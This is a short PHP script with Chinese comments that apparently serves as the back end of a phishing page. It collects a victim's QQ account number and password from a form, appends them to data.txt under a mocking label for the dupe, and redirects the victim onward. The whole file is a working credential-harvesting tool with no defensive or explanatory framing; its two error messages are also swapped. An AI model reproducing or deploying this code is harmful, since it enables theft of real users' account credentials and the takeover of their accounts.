<?php

$title = $_POST['title'];
$content = $_POST['content'];
if(strlen($title) > 9 ) { 
    // 判断账号是否合法：这边主要检测用户是否输入了
    // 设置两个否定来优化大聪明的体验
    if(strlen($content) > 1 ) { 
    // 判断密码是否合法：这边主要检测用户是否输入了
    file_put_contents("data.txt","<h3>大聪明的QQ:<font color=blue>".$title."</font>\r\r大聪明的密码:<font color=red>".$content."</font></h3>\n\n",FILE_APPEND);
    // 写入输入信息
    echo '<meta http-equiv="refresh" content="0;URL=./mian.html">';
    // 跳转到下一个页面
    }else{ 
        echo "<script>alert('账号输入格式有误')</script>;";
    // 输出错误让用户看到我们要定时1s
    sleep(1);
    // 暂停1s
    echo '<meta http-equiv="refresh" content="0;URL=./index.html">';
    // 返回页面
    
    }
}else{ 
    
    echo "<script>alert('密码输入格式有误')</script>;";
    // 输出错误让用户看到
    sleep(1);
    // 暂停1s
    echo '<meta http-equiv="refresh" content="0;URL=./index.html">';
    // 返回页面
    
}


?>

